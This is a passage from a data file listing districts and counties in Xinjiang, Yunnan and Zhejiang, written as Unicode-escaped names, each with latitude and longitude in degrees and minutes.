"43", "82", "58"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u6C99\u96C5\u53BF", "41", "13", "82", "47"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u58A8\u7389\u53BF", "37", "16", "79", "44"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4E8E\u7530\u53BF", "36", "51", "81", "40"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u7B56\u52D2\u53BF", "37", "0", "80", "48"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u6D1B\u6D66\u53BF", "37", "4", "80", "11"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u548C\u7530\u53BF", "37", "6", "79", "56"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u6C11\u4E30\u53BF", "37", "4", "82", "41"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4E14\u672B\u53BF", "38", "8", "85", "32"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u82E5\u7F8C\u53BF", "39", "1", "88", "10"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4F0A\u543E\u53BF", "43", "15", "94", "42"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5DF4\u91CC\u5764\u54C8\u8428\u514B\u81EA\u6CBB\u53BF", "43", "36", "93", "1"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u6728\u5792\u54C8\u8428\u514B\u81EA\u6CBB\u53BF", "43", "50", "90", "17"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u6258\u514B\u900A\u53BF", "42", "47", "88", "39"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5409\u6728\u8428\u5C14\u53BF", "43", "60", "89", "11"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5947\u53F0\u53BF", "44", "1", "89", "35"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u912F\u5584\u53BF", "42", "52", "90", "13"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u548C\u7855\u53BF", "42", "16", "86", "52"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u548C\u9759\u53BF", "42", "19", "86", "24"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u7109\u8006\u56DE\u65CF\u81EA\u6CBB\u53BF", "42", "4", "86", "34"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u535A\u6E56\u53BF", "41", "59", "86", "38"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5C09\u7281\u53BF", "41", "20", "86", "15"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4E4C\u9C81\u6728\u9F50\u53BF", "43", "48", "87", "36"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u739B\u7EB3\u65AF\u53BF", "44", "18", "86", "13"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u547C\u56FE\u58C1\u53BF", "44", "11", "86", "54"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u6C99\u6E7E\u53BF", "44", "20", "85", "37"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u548C\u5E03\u514B\u8D5B\u5C14\u8499\u53E4\u81EA\u6CBB\u53BF", "46", "48", "85", "43"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5409\u6728\u4E43\u53BF", "47", "26", "85", "53"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5E03\u5C14\u6D25\u53BF", "47", "42", "86", "51"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u54C8\u5DF4\u6CB3\u53BF", "48", "4", "86", "25"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5BCC\u8574\u53BF", "46", "60", "89", "31"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u798F\u6D77\u53BF", "47", "7", "87", "30"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u989D\u654F\u53BF", "46", "32", "83", "38"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u9752\u6CB3\u53BF", "46", "40", "90", "23"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u6258\u91CC\u53BF", "45", "56", "83", "36"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u8FBE\u5742\u57CE\u533A", "43", "21", "88", "18"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u6C99\u4F9D\u5DF4\u514B\u533A", "43", "47", "87", "36"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5929\u5C71\u533A", "43", "47", "87", "39"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u88D5\u6C11\u53BF", "46", "12", "82", "59"], ["\u4E91\u5357\u7701", "\u6606\u660E\u5E02", "25", "3", "102", "43"], ["\u4E91\u5357\u7701", "\u4E34\u6CA7\u5E02", "23", "53", "100", "5"], ["\u4E91\u5357\u7701", "\u897F\u53CC\u7248\u7EB3\u50A3\u65CF\u81EA\u6CBB\u5DDE", "22", "1", "100", "48"], ["\u4E91\u5357\u7701", "\u666E\u6D31\u5E02", "22", "47", "100", "58"], ["\u4E91\u5357\u7701", "\u695A\u96C4\u5F5D\u65CF\u81EA\u6CBB\u5DDE", "25", "2", "101", "33"], ["\u4E91\u5357\u7701", "\u7389\u6EAA\u5E02", "24", "21", "102", "33"], ["\u4E91\u5357\u7701", "\u5927\u7406\u767D\u65CF\u81EA\u6CBB\u5DDE", "25", "36", "100", "14"], ["\u4E91\u5357\u7701", "\u4FDD\u5C71\u5E02", "25", "7", "99", "10"], ["\u4E91\u5357\u7701", "\u5FB7\u5B8F\u50A3\u65CF\u666F\u9887\u65CF\u81EA\u6CBB\u5DDE", "24", "26", "98", "35"], ["\u4E91\u5357\u7701", "\u6012\u6C5F\u5088\u50F3\u65CF\u81EA\u6CBB\u5DDE", "25", "51", "98", "51"], ["\u4E91\u5357\u7701", "\u4E3D\u6C5F\u5E02", "26", "53", "100", "14"], ["\u4E91\u5357\u7701", "\u8FEA\u5E86\u85CF\u65CF\u81EA\u6CBB\u5DDE", "27", "50", "99", "42"], ["\u4E91\u5357\u7701", "\u662D\u901A\u5E02", "27", "20", "103", "43"], ["\u4E91\u5357\u7701", "\u66F2\u9756\u5E02", "25", "30", "103", "48"], ["\u4E91\u5357\u7701", "\u6587\u5C71\u58EE\u65CF\u82D7\u65CF\u81EA\u6CBB\u5DDE", "23", "22", "104", "15"], ["\u4E91\u5357\u7701", "\u7EA2\u6CB3\u54C8\u5C3C\u65CF\u5F5D\u65CF\u81EA\u6CBB\u5DDE", "23", "22", "103", "24"], ["\u4E91\u5357\u7701", "\u666E\u6D31\u5E02", "22", "47", "100", "58"], ["\u4E91\u5357\u7701", "\u4E34\u7FD4\u533A", "23", "53", "100", "5"], ["\u4E91\u5357\u7701", "\u9686\u9633\u533A", "25", "7", "99", "10"], ["\u4E91\u5357\u7701", "\u53E4\u57CE\u533A", "26", "53", "100", "14"], ["\u4E91\u5357\u7701", "\u897F\u5C71\u533A", "25", "2", "102", "40"], ["\u4E91\u5357\u7701", "\u4E94\u534E\u533A", "25", "3", "102", "42"], ["\u4E91\u5357\u7701", "\u76D8\u9F99\u533A", "25", "2", "102", "43"], ["\u4E91\u5357\u7701", "\u5B98\u6E21\u533A", "25", "1", "102", "45"], ["\u4E91\u5357\u7701", "\u4E1C\u5DDD\u533A", "26", "5", "103", "11"], ["\u4E91\u5357\u7701", "\u662D\u9633\u533A", "27", "20", "103", "43"], ["\u4E91\u5357\u7701", "\u9E92\u9E9F\u533A", "25", "30", "103", "48"], ["\u4E91\u5357\u7701", "\u666F\u6D2A\u5E02", "22", "1", "100", "48"], ["\u4E91\u5357\u7701", "\u695A\u96C4\u5E02", "25", "2", "101", "33"], ["\u4E91\u5357\u7701", "\u5B89\u5B81\u5E02", "24", "55", "102", "29"], ["\u4E91\u5357\u7701", "\u5927\u7406\u5E02", "25", "36", "100", "14"], ["\u4E91\u5357\u7701", "\u6F5E\u897F\u5E02", "24", "26", "98", "35"], ["\u4E91\u5357\u7701", "\u745E\u4E3D\u5E02", "24", "1", "97", "51"], ["\u4E91\u5357\u7701", "\u5BA3\u5A01\u5E02", "26", "13", "104", "6"], ["\u4E91\u5357\u7701", "\u5F00\u8FDC\u5E02", "23", "43", "103", "16"], ["\u4E91\u5357\u7701", "\u4E2A\u65E7\u5E02", "23", "22", "103", "9"], ["\u4E91\u5357\u7701", "\u7EE5\u6C5F\u53BF", "28", "36", "103", "57"], ["\u4E91\u5357\u7701", "\u6C34\u5BCC\u53BF", "28", "38", "104", "24"], ["\u4E91\u5357\u7701", "\u9547\u5EB7\u53BF", "23", "47", "98", "50"], ["\u4E91\u5357\u7701", "\u6CA7\u6E90\u4F64\u65CF\u81EA\u6CBB\u53BF", "23", "9", "99", "15"], ["\u4E91\u5357\u7701", "\u803F\u9A6C\u50A3\u65CF\u4F64\u65CF\u81EA\u6CBB\u53BF", "23", "33", "99", "24"], ["\u4E91\u5357\u7701", "\u53CC\u6C5F\u62C9\u795C\u65CF\u4F64\u65CF\u5E03\u6717\u65CF\u50A3\u65CF\u81EA\u6CBB\u53BF", "23", "28", "99", "50"], ["\u4E91\u5357\u7701", "\u897F\u76DF\u4F64\u65CF\u81EA\u6CBB\u53BF", "22", "38", "99", "37"], ["\u4E91\u5357\u7701", "\u6F9C\u6CA7\u62C9\u795C\u65CF\u81EA\u6CBB\u53BF", "22", "33", "99", "56"], ["\u4E91\u5357\u7701", "\u52D0\u6D77\u53BF", "21", "58", "100", "27"], ["\u4E91\u5357\u7701", "\u5B5F\u8FDE\u50A3\u65CF\u62C9\u795C\u65CF\u4F64\u65CF\u81EA\u6CBB\u53BF", "22", "20", "99", "35"], ["\u4E91\u5357\u7701", "\u52D0\u814A\u53BF", "21", "29", "101", "34"], ["\u4E91\u5357\u7701", "\u6C5F\u57CE\u54C8\u5C3C\u65CF\u5F5D\u65CF\u81EA\u6CBB\u53BF", "22", "35", "101", "51"], ["\u4E91\u5357\u7701", "\u7EFF\u6625\u53BF", "22", "60", "102", "24"], ["\u4E91\u5357\u7701", "\u5143\u9633\u53BF", "23", "14", "102", "50"], ["\u4E91\u5357\u7701", "\u5EFA\u6C34\u53BF", "23", "37", "102", "50"], ["\u4E91\u5357\u7701", "\u77F3\u5C4F\u53BF", "23", "43", "102", "30"], ["\u4E91\u5357\u7701", "\u7EA2\u6CB3\u53BF", "23", "22", "102", "25"], ["\u4E91\u5357\u7701", "\u5143\u6C5F\u54C8\u5C3C\u65CF\u5F5D\u65CF\u50A3\u65CF\u81EA\u6CBB\u53BF", "23", "36", "102", "0"], ["\u4E91\u5357\u7701", "\u58A8\u6C5F\u54C8\u5C3C\u65CF\u81EA\u6CBB\u53BF", "23", "26", "101", "41"], ["\u4E91\u5357\u7701", "\u5B81\u6D31\u54C8\u5C3C\u65CF\u5F5D\u65CF\u81EA\u6CBB\u53BF", "23", "4", "101", "3"], ["\u4E91\u5357\u7701", "\u666F\u8C37\u50A3\u65CF\u5F5D\u65CF\u81EA\u6CBB\u53BF", "23", "30", "100", "42"], ["\u4E91\u5357\u7701", "\u666F\u4E1C\u5F5D\u65CF\u81EA\u6CBB\u53BF", "24", "27", "100", "50"], ["\u4E91\u5357\u7701", "\u5357\u6DA7\u5F5D\u65CF\u81EA\u6CBB\u53BF", "25", "3", "100", "31"], ["\u4E91\u5357\u7701", "\u5357\u534E\u53BF", "25", "12", "101", "16"], ["\u4E91\u5357\u7701", "\u53CC\u67CF\u53BF", "24", "42", "101", "38"], ["\u4E91\u5357\u7701", "\u9547\u6C85\u5F5D\u65CF\u54C8\u5C3C\u65CF\u62C9\u795C\u65CF\u81EA\u6CBB\u53BF", "24", "0", "101", "6"], ["\u4E91\u5357\u7701", "\u65B0\u5E73\u5F5D\u65CF\u50A3\u65CF\u81EA\u6CBB\u53BF", "24", "4", "101", "59"], ["\u4E91\u5357\u7701", "\u5CE8\u5C71\u5F5D\u65CF\u81EA\u6CBB\u53BF", "24", "11", "102", "24"], ["\u4E91\u5357\u7701", "\u901A\u6D77\u53BF", "24", "7", "102", "45"], ["\u4E91\u5357\u7701", "\u534E\u5B81\u53BF", "24", "12", "102", "56"], ["\u4E91\u5357\u7701", "\u6C5F\u5DDD\u53BF", "24", "17", "102", "45"], ["\u4E91\u5357\u7701", "\u664B\u5B81\u53BF", "24", "40", "102", "36"], ["\u4E91\u5357\u7701", "\u6F84\u6C5F\u53BF", "24", "40", "102", "55"], ["\u4E91\u5357\u7701", "\u5448\u8D21\u53BF", "24", "53", "102", "48"], ["\u4E91\u5357\u7701", "\u5BCC\u6C11\u53BF", "25", "13", "102", "30"], ["\u4E91\u5357\u7701", "\u7984\u4E30\u53BF", "25", "9", "102", "5"], ["\u4E91\u5357\u7701", "\u6613\u95E8\u53BF", "24", "40", "102", "10"], ["\u4E91\u5357\u7701", "\u5143\u8C0B\u53BF", "25", "42", "101", "53"], ["\u4E91\u5357\u7701", "\u6B66\u5B9A\u53BF", "25", "32", "102", "24"], ["\u4E91\u5357\u7701", "\u7984\u529D\u5F5D\u65CF\u82D7\u65CF\u81EA\u6CBB\u53BF", "25", "33", "102", "28"], ["\u4E91\u5357\u7701", "\u5D69\u660E\u53BF", "25", "21", "103", "2"], ["\u4E91\u5357\u7701", "\u534E\u576A\u53BF", "26", "38", "101", "16"], ["\u4E91\u5357\u7701", "\u6C38\u4EC1\u53BF", "26", "4", "101", "40"], ["\u4E91\u5357\u7701", "\u725F\u5B9A\u53BF", "25", "19", "101", "32"], ["\u4E91\u5357\u7701", "\u59DA\u5B89\u53BF", "25", "30", "101", "14"], ["\u4E91\u5357\u7701", "\u5927\u59DA\u53BF", "25", "44", "101", "19"], ["\u4E91\u5357\u7701", "\u7965\u4E91\u53BF", "25", "29", "100", "33"], ["\u4E91\u5357\u7701", "\u5F25\u6E21\u53BF", "25", "21", "100", "29"], ["\u4E91\u5357\u7701", "\u5BBE\u5DDD\u53BF", "25", "50", "100", "35"], ["\u4E91\u5357\u7701", "\u6C38\u80DC\u53BF", "26", "41", "100", "45"], ["\u4E91\u5357\u7701", "\u9E64\u5E86\u53BF", "26", "34", "100", "11"], ["\u4E91\u5357\u7701", "\u6D31\u6E90\u53BF", "26", "7", "99", "57"], ["\u4E91\u5357\u7701", "\u5251\u5DDD\u53BF", "26", "32", "99", "54"], ["\u4E91\u5357\u7701", "\u5170\u576A\u767D\u65CF\u666E\u7C73\u65CF\u81EA\u6CBB\u53BF", "26", "27", "99", "25"], ["\u4E91\u5357\u7701", "\u4E91\u9F99\u53BF", "25", "53", "99", "22"], ["\u4E91\u5357\u7701", "\u6C38\u5E73\u53BF", "25", "28", "99", "32"], ["\u4E91\u5357\u7701", "\u6F3E\u6FDE\u5F5D\u65CF\u81EA\u6CBB\u53BF", "25", "40", "99", "57"], ["\u4E91\u5357\u7701", "\u5DCD\u5C71\u5F5D\u65CF\u56DE\u65CF\u81EA\u6CBB\u53BF", "25", "14", "100", "18"], ["\u4E91\u5357\u7701", "\u4E91\u53BF", "24", "27", "100", "8"], ["\u4E91\u5357\u7701", "\u51E4\u5E86\u53BF", "24", "36", "99", "55"], ["\u4E91\u5357\u7701", "\u6C38\u5FB7\u53BF", "24", "2", "99", "15"], ["\u4E91\u5357\u7701", "\u65BD\u7538\u53BF", "24", "44", "99", "11"], ["\u4E91\u5357\u7701", "\u660C\u5B81\u53BF", "24", "50", "99", "36"], ["\u4E91\u5357\u7701", "\u817E\u51B2\u53BF", "25", "2", "98", "30"], ["\u4E91\u5357\u7701", "\u6881\u6CB3\u53BF", "24", "49", "98", "18"], ["\u4E91\u5357\u7701", "\u9F99\u9675\u53BF", "24", "35", "98", "41"], ["\u4E91\u5357\u7701", "\u9647\u5DDD\u53BF", "24", "12", "97", "48"], ["\u4E91\u5357\u7701", "\u76C8\u6C5F\u53BF", "24", "43", "97", "56"], ["\u4E91\u5357\u7701", "\u6CF8\u6C34\u53BF", "25", "51", "98", "51"], ["\u4E91\u5357\u7701", "\u8D21\u5C71\u72EC\u9F99\u65CF\u6012\u65CF\u81EA\u6CBB\u53BF", "27", "44", "98", "40"], ["\u4E91\u5357\u7701", "\u798F\u8D21\u53BF", "26", "54", "98", "52"], ["\u4E91\u5357\u7701", "\u7EF4\u897F\u5088\u50F3\u65CF\u81EA\u6CBB\u53BF", "27", "11", "99", "17"], ["\u4E91\u5357\u7701", "\u7389\u9F99\u7EB3\u897F\u65CF\u81EA\u6CBB\u53BF", "26", "49", "100", "14"], ["\u4E91\u5357\u7701", "\u9999\u683C\u91CC\u62C9\u53BF", "27", "50", "99", "42"], ["\u4E91\u5357\u7701", "\u5FB7\u94A6\u53BF", "28", "29", "98", "55"], ["\u4E91\u5357\u7701", "\u5B81\u8497\u5F5D\u65CF\u81EA\u6CBB\u53BF", "27", "17", "100", "51"], ["\u4E91\u5357\u7701", "\u5DE7\u5BB6\u53BF", "26", "55", "102", "55"], ["\u4E91\u5357\u7701", "\u9C81\u7538\u53BF", "27", "12", "103", "33"], ["\u4E91\u5357\u7701", "\u5F5D\u826F\u53BF", "27", "38", "104", "3"], ["\u4E91\u5357\u7701", "\u5927\u5173\u53BF", "27", "45", "103", "53"], ["\u4E91\u5357\u7701", "\u76D0\u6D25\u53BF", "28", "7", "104", "14"], ["\u4E91\u5357\u7701", "\u5A01\u4FE1\u53BF", "27", "51", "105", "3"], ["\u4E91\u5357\u7701", "\u9547\u96C4\u53BF", "27", "27", "104", "52"], ["\u4E91\u5357\u7701", "\u6C38\u5584\u53BF", "28", "14", "103", "38"], ["\u4E91\u5357\u7701", "\u4F1A\u6CFD\u53BF", "26", "25", "103", "18"], ["\u4E91\u5357\u7701", "\u5BFB\u7538\u56DE\u65CF\u5F5D\u65CF\u81EA\u6CBB\u53BF", "25", "34", "103", "15"], ["\u4E91\u5357\u7701", "\u6CBE\u76CA\u53BF", "25", "37", "103", "49"], ["\u4E91\u5357\u7701", "\u9A6C\u9F99\u53BF", "25", "26", "103", "35"], ["\u4E91\u5357\u7701", "\u5BCC\u6E90\u53BF", "25", "40", "104", "15"], ["\u4E91\u5357\u7701", "\u7F57\u5E73\u53BF", "24", "53", "104", "18"], ["\u4E91\u5357\u7701", "\u5E08\u5B97\u53BF", "24", "50", "103", "59"], ["\u4E91\u5357\u7701", "\u9646\u826F\u53BF", "25", "2", "103", "40"], ["\u4E91\u5357\u7701", "\u5B9C\u826F\u53BF", "24", "55", "103", "9"], ["\u4E91\u5357\u7701", "\u77F3\u6797\u5F5D\u65CF\u81EA\u6CBB\u53BF", "24", "46", "103", "16"], ["\u4E91\u5357\u7701", "\u6CF8\u897F\u53BF", "24", "32", "103", "46"], ["\u4E91\u5357\u7701", "\u5F25\u52D2\u53BF", "24", "24", "103", "26"], ["\u4E91\u5357\u7701", "\u4E18\u5317\u53BF", "24", "3", "104", "11"], ["\u4E91\u5357\u7701", "\u5E7F\u5357\u53BF", "24", "3", "105", "4"], ["\u4E91\u5357\u7701", "\u5BCC\u5B81\u53BF", "23", "38", "105", "37"], ["\u4E91\u5357\u7701", "\u9EBB\u6817\u5761\u53BF", "23", "7", "104", "42"], ["\u4E91\u5357\u7701", "\u897F\u7574\u53BF", "23", "27", "104", "40"], ["\u4E91\u5357\u7701", "\u781A\u5C71\u53BF", "23", "37", "104", "20"], ["\u4E91\u5357\u7701", "\u6587\u5C71\u53BF", "23", "22", "104", "15"], ["\u4E91\u5357\u7701", "\u8499\u81EA\u53BF", "23", "22", "103", "24"], ["\u4E91\u5357\u7701", "\u6CB3\u53E3\u7476\u65CF\u81EA\u6CBB\u53BF", "22", "31", "103", "58"], ["\u4E91\u5357\u7701", "\u9A6C\u5173\u53BF", "23", "1", "104", "24"], ["\u4E91\u5357\u7701", "\u5C4F\u8FB9\u82D7\u65CF\u81EA\u6CBB\u53BF", "22", "59", "103", "41"], ["\u4E91\u5357\u7701", "\u91D1\u5E73\u82D7\u65CF\u7476\u65CF\u50A3\u65CF\u81EA\u6CBB\u53BF", "22", "47", "103", "13"], ["\u6D59\u6C5F\u7701", "\u676D\u5DDE\u5E02", "30", "17", "120", "9"], ["\u6D59\u6C5F\u7701", "\u4E0A\u57CE\u533A", "30", "15", "120", "10"], ["\u6D59\u6C5F\u7701", "\u4E0B\u57CE\u533A", "30", "17", "120", "10"], ["\u6D59\u6C5F\u7701", "\u62F1\u5885\u533A", "30", "19", "120", "8"], ["\u6D59\u6C5F\u7701", "\u6C5F\u5E72\u533A", "30", "16", "120", "12"], ["\u6D59\u6C5F\u7701", "\u897F\u6E56\u533A", "30", "16", "120", "8"], ["\u6D59\u6C5F\u7701", "\u6EE8\u6C5F\u533A", "30", "12", "120", "12"], ["\u6D59\u6C5F\u7701", "\u8427\u5C71\u533A", "30", "10", "120", "16"], ["\u6D59\u6C5F\u7701", "\u4F59\u676D\u533A", "30", "25", "120", "18"], ["\u6D59\u6C5F\u7701", "\u4E34\u5B89\u5E02", "30", "14", "119", "43"], ["\u6D59\u6C5F\u7701", "\u6850\u5E90\u53BF", "29", "48", "119", "40"], ["\u6D59\u6C5F\u7701", "\u5BCC\u9633\u5E02", "30", "3", "119", "57"], ["\u6D59\u6C5F\u7701", "\u5EFA\u5FB7\u5E02", "29", "29", "119", "17"], ["\u6D59\u6C5F\u7701", "\u6DF3\u5B89\u53BF", "29", "36", "119", "2"], ["\u6D59\u6C5F\u7701", "\u5B81\u6CE2\u5E02", "29", "53", "121", "33"], ["\u6D59\u6C5F\u7701", "\u6D77\u66D9\u533A", "29", "52", "121", "33"], ["\u6D59\u6C5F\u7701", "\u6C5F\u4E1C\u533A", "29", "52", "121", "34"], ["\u6D59\u6C5F\u7701", "\u6C5F\u5317\u533A", "29", "53", "121", "33"], ["\u6D59\u6C5F\u7701", "\u5317\u4ED1\u533A", "29", "56", "121", "51"], ["\u6D59\u6C5F\u7701", "\u9547\u6D77\u533A", "29", "57", "121", "43"], ["\u6D59\u6C5F\u7701", "\u911E\u5DDE\u533A", "29", "50", "121", "32"], ["\u6D59\u6C5F\u7701", "\u4F59\u59DA\u5E02", "30", "2", "121", "9"], ["\u6D59\u6C5F\u7701", "\u6148\u6EAA\u5E02", "30", "10", "121", "14"], ["\u6D59\u6C5F\u7701", "\u5949\u5316\u5E02", "29", "39", "121", "24"], ["\u6D59\u6C5F\u7701", "\u5B81\u6D77\u53BF", "29", "17", "121", "26"], ["\u6D59\u6C5F\u7701", "\u8C61\u5C71\u53BF", "29", "29", "121", "52"], ["\u6D59\u6C5F\u7701", "\u6E29\u5DDE\u5E02", "27", "60", "120", "42"], ["\u6D59\u6C5F\u7701", "\u9E7F\u57CE\u533A", "28", "1", "120", "39"], ["\u6D59\u6C5F\u7701", "\u9F99\u6E7E\u533A", "27", "56", "120", "49"], ["\u6D59\u6C5F\u7701", "\u74EF\u6D77\u533A", "28", "1", "120", "38"], ["\u6D59\u6C5F\u7701", "\u745E\u5B89\u5E02", "27", "47", "120", "38"], ["\u6D59\u6C5F\u7701", "\u6C38\u5609\u53BF", "28", "9", "120", "41"], ["\u6D59\u6C5F\u7701", "\u4E50\u6E05\u5E02", "28", "8", "120", "57"], ["\u6D59\u6C5F\u7701", "\u5E73\u9633\u53BF", "27", "40", "120", "34"], ["\u6D59\u6C5F\u7701", "\u82CD\u5357\u53BF", "27", "30", "120", "24"], ["\u6D59\u6C5F\u7701", "\u6587\u6210\u53BF", "27", "47", "120", "5"], ["\u6D59\u6C5F\u7701", "\u6CF0\u987A\u53BF", "27", "34", "119", "43"], ["\u6D59\u6C5F\u7701", "\u6D1E\u5934\u53BF", "27", "50", "121", "9"], ["\u6D59\u6C5F\u7701", "\u7ECD\u5174\u5E02", "30", "0", "120", "34"], ["\u6D59\u6C5F\u7701", "\u8D8A\u57CE\u533A", "30", "0", "120", "34"], ["\u6D59\u6C5F\u7701", "\u7ECD\u5174\u53BF", "30", "5", "120", "28"], ["\u6D59\u6C5F\u7701", "\u4E0A\u865E\u5E02", "30", "2", "120", "52"], ["\u6D59\u6C5F\u7701", "\u5D4A\u5DDE\u5E02", "29", "35", "120", "49"], ["\u6D59\u6C5F\u7701", "\u65B0\u660C\u53BF", "29", "30", "120", "54"], ["\u6D59\u6C5F\u7701", "\u8BF8\u66A8\u5E02", "29", "43", "120", "14"], ["\u6D59\u6C5F\u7701", "\u5609\u5174\u5E02", "30", "45", "120", "45"], ["\u6D59\u6C5F\u7701", "\u5357\u6E56\u533A", "30", "46", "120", "45"], ["\u6D59\u6C5F\u7701", "\u79C0\u6D32\u533A", "30", "46", "120", "42"], ["\u6D59\u6C5F\u7701", "\u6D77\u5B81\u5E02", "30", "32", "120", "41"], ["\u6D59\u6C5F\u7701", "\u5609\u5584\u53BF", "30", "51", "120", "55"], ["\u6D59\u6C5F\u7701", "\u6D77\u76D0\u53BF", "30", "32", "120", "57"], ["\u6D59\u6C5F\u7701", "\u6850\u4E61\u5E02", "30", "38", "120", "34"], ["\u6D59\u6C5F\u7701", "\u5E73\u6E56\u5E02", "30", "42", "121", "1"], ["\u6D59\u6C5F\u7701", "\u6E56\u5DDE\u5E02", "30", "54", "120", "5"], ["\u6D59\u6C5F\u7701", "\u5434\u5174\u533A", "30", "52", "120", "7"], ["\u6D59\u6C5F\u7701", "\u5357\u6D54\u533A", "30", "53", "120", "26"], ["\u6D59\u6C5F\u7701", "\u5FB7\u6E05\u53BF", "30", "32", "119", "58"], ["\u6D59\u6C5F\u7701", "\u957F\u5174\u53BF", "31", "1", "119", "54"], ["\u6D59\u6C5F\u7701", "\u5B89\u5409\u53BF", "30", "38", "119", "41"], ["\u6D59\u6C5F\u7701", "\u91D1\u534E\u5E02", "29", "5", "119", "39"], ["\u6D59\u6C5F\u7701", "\u5A7A\u57CE\u533A", "29", "5", "119", "39"], ["\u6D59\u6C5F\u7701", "\u91D1\u4E1C\u533A", "29", "5", "119", "42"], ["\u6D59\u6C5F\u7701", "\u5170\u6EAA\u5E02", "29", "13", "119", "27"], ["\u6D59\u6C5F\u7701", "\u6C38\u5EB7\u5E02", "28", "54", "120", "2"], ["\u6D59\u6C5F\u7701", "\u6B66\u4E49\u53BF", "28", "54", "119", "49"], ["\u6D59\u6C5F\u7701", "\u4E1C\u9633\u5E02", "29", "17", "120", "14"], ["\u6D59\u6C5F\u7701", "\u78D0\u5B89\u53BF", "29", "3", "120", "26"], ["\u6D59\u6C5F\u7701", "\u4E49\u4E4C\u5E02", "29", "18", "120", "4"], ["\u6D59\u6C5F\u7701", "\u6D66\u6C5F\u53BF", "29", "27", "119", "53"], ["\u6D59\u6C5F\u7701", "\u8862\u5DDE\u5E02", "28", "56", "118", "52"], ["\u6D59\u6C5F\u7701", "\u67EF\u57CE\u533A", "28", "56", "118", "52"], ["\u6D59\u6C5F\u7701", "\u8862\u6C5F\u533A", "28", "59", "118", "56"], ["\u6D59\u6C5F\u7701", "\u6C5F\u5C71\u5E02", "28", "45", "118", "37"], ["\u6D59\u6C5F\u7701", "\u5E38\u5C71\u53BF", "28", "54", "118", "31"], ["\u6D59\u6C5F\u7701", "\u9F99\u6E38\u53BF", "29", "2", "119", "10"], ["\u6D59\u6C5F\u7701", "\u5F00\u5316\u53BF", "29", "8", "118", "25"], ["\u6D59\u6C5F\u7701", "\u821F\u5C71\u5E02", "29", "60", "122", "12"], ["\u6D59\u6C5F\u7701", "\u5B9A\u6D77\u533A", "30", "1", "122", "6"], ["\u6D59\u6C5F\u7701", "\u666E\u9640\u533A", "29", "57", "122", "18"], ["\u6D59\u6C5F\u7701", "\u5CB1\u5C71\u53BF", "30", "15", "122", "12"], ["\u6D59\u6C5F\u7701", "\u5D4A\u6CD7\u53BF", "30", "44", "122", "27"], ["\u6D59\u6C5F\u7701", "\u53F0\u5DDE\u5E02", "28", "41", "121", "26"], ["\u6D59\u6C5F\u7701", "\u6912\u6C5F\u533A", "28", "41", "121", "26"], ["\u6D59\u6C5F\u7701", "\u9EC4\u5CA9\u533A", "28", "39", "121", "16"], ["\u6D59\u6C5F\u7701", "\u8DEF\u6865\u533A", "28", "35", "121", "23"], ["\u6D59\u6C5F\u7701", "\u4E34\u6D77\u5E02", "28", "51", "121", "7"], ["\u6D59\u6C5F\u7701", "\u675C\u6865\u9547", "28", "46", "121", "30"], ["\u6D59\u6C5F\u7701", "\u6E29\u5CAD\u5E02", "28", "22", "121", "22"], ["\u6D59\u6C5F\u7701", "\u4ED9\u5C45\u53BF", "28", "52", "120", "44"], ["\u6D59\u6C5F\u7701", "\u5929\u53F0\u53BF", "29", "8", "121", "2"], ["\u6D59\u6C5F\u7701", "\u4E09\u95E8\u53BF", "29", "7", "121", "23"], ["\u6D59\u6C5F\u7701", 